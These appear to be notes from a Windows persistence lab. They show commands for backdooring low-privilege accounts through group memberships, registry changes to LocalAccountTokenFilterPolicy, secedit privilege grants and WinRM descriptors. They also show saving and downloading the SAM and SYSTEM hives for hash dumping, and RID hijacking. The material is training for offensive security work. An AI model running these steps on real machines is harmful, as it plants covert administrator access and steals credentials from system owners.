Task 1 - Introduction
------------------------------------

After gaining a first foothold (or any additional footholds) it's important we establish some kind of persistence so that we can get back in easily.  This way we don't have to go through an try and exploit the machine again.

There's a lot of reasons for this like:

-   **Re-exploitation isn't always possible**: Some unstable exploits might kill the vulnerable process during exploitation, getting you a single shot at some of them.
-   **Gaining a foothold is hard to reproduce**: For example, if you used a phishing campaign to get your first access, repeating it to regain access to a host is simply too much work. Your second campaign might also not be as effective, leaving you with no access to the network.
-   **The blue team is after you**: Any vulnerability used to gain your first access might be patched if your actions get detected. You are in a race against the clock!

It would be nice to have some administrator's password hash but eventually that will probably get rotated.  Anyway, there are sneakier way to regain access to a compromised machine, making life harder for the blue team.

In this room we will look at ways to established persistence in Windows systems.

Task 2 - Tampering with Underprivileged Accounts
--------------------------------------------------------------------------------

It might be easiest to just use some Administrator credentials to get back in, but to make it harder for blue teams to spot us, it's better to manipulate some underprivileged accounts. These won't be scrutinized or monitored as much.

Start the machine:
Username: <span class="highlight" style="color: blue; background-color: #072742">Administrator</span>
Password:  <span class="highlight" style="color: blue; background-color: #072742">Password321</span>

You can connect using the in-browser app, or via RDP client.

### Assign Group Memberships

For this task we assume we have password hashes for some underprivileged users that we have cracked.

The direct way to make an underprivileged user gain admin rights is to add it to the Administrator group:

```shell
C:\> net localgroup administrators thmuser0 /add
```

This will allow you to access the server via RDP, WinRM, or other remote administration service available.

This method may look suspicious so we can also use the Backup Operators group. These users won't have direct Admin rights, but will have access to read/write any file or registry key on the system, ignoring configured DACLs.  This way we can copy the SAM and SYSTEM registry hives, which we can use to recover hashes for all users, enabling us to escalate to any admin account trivially.

First add ourselves to the Backup Operators group:

```shell
C:\> net localgroup "Backup Operators" thmuser1 /add
```

Note, here is some quick help on net localgroup:
```shell
C:\>net localgroup
Aliases for \\techblogger-pc
----------------------------------------------------------------------------
*Administrators
*Backup Operators
*Debugger Users
*Guests
*Network Configuration Operators
*Power Users
*Remote Desktop Users
*Replicator
*Users
The command completed successfully.

# list members of a group
net localgroup groupName

# list all groups a user is a member of
net user userName

# domain style
net user /domain username | find “Group Name”
```

Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups. We'll use WinRM for this task:

```shell
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

Now let's connect back in with WinRM using the credential:

Username: <span class="highlight" style="color: blue; background-color: #072742">thmuser1</span>
Password:  <span class="highlight" style="color: blue; background-color: #072742">Password321</span>


If you tried to connect right now from your attacker machine, you'd be surprised to see that even if you are on the Backups Operators group, you wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled:

```shell
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================

NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group

Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

This is due to User Account Control (UAC). One of the features implemented by UAC, **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a graphical user session (Read more on UAC [here](https://tryhackme.com/room/windowsfundamentals1xbx)), if you are using WinRM, you are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:

```shell
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Once all of this has been set up, we are ready to use our backdoor user. First, let's establish a WinRM connection and check that the Backup Operators group is enabled for our user:
```shell
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
        
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group

BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:

```shell
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

**Note:** If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools:

```shell
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

```

And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:


**Note:**  Using the Administrator console gained through the thmuser1, execute `C:\flags\flag1.exe` to retrieve your flag.

### Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. A complete list of available privileges can be found [here](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) for reference.

In the case of the Backup Operators group, it has the following two privileges assigned by default:

-   **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
-   **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file:

```powershell
secedit /export /cfg config.inf
```

We open the file and add our user to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege:

![[Pasted image 20230205225000.png]]

We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:

```powershell
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

You should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a **security descriptor** as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

This will open a window where you can add thmuser2 and assign it full privileges to connect to WinRM:

![[Pasted image 20230205225236.png]]

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

Notice that for this user to work with the given privileges fully, you'd have to change the **LocalAccountTokenFilterPolicy** registry key, but we've done this already to get the previous flag.

If you check your user's group memberships, it will look like a regular user. Nothing suspicious at all!

```shell
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None
```

Once again, we'll assume we have already dumped the credentials on the server and have thmuser2's password. Let's connect with its credentials using WinRM:

Username: <span class="highlight" style="color: blue; background-color: #072742">thmuser2</span>
Password:  <span class="highlight" style="color: blue; background-color: #072742">Password321</span>

We can log in with those credentials to obtain the flag.

**NOTE:** Log in to the machine via WinRM using thmuser2 and execute `C:\flags\flag2.exe` to retrieve your flag.

### RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.

When a user is created, an identifier called **Relative ID (RID)** is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the **RID = 500**, and regular users usually have **RID >= 1000**.

To find the assigned RIDs for any user, you can use the following command:

```shell
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

The RID is the last bit of the SID (1010 for thmuser3 and 500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in your machine:

```shell
C:\tools\pstools> PsExec64.exe -i -s regedit
```

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called **F**, which holds the user's effective RID at position 0x30:

![[Pasted image 20230205230055.png]]

Notice the RID is stored using little-endian notation, so its bytes appear reversed.

We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):

![[Pasted image 20230205230148.png]]

The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

For this task, we assume you have already compromised the system and obtained the password for thmuser3. For your convenience, the user can connect via RDP with the following credentials:

Username: <span class="highlight" style="color: blue; background-color: #072742">thmuser3</span>
Password:  <span class="highlight" style="color: blue; background-color: #072742">Password321</span>

If you did everything correctly, you should be logged in to the Administrator's desktop. 

  
Note: When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing Reconnect.

**Note:** Log in to the machine via RDP using thmuser3 and execute `C:\flags\flag3.exe` to retrieve your flag.
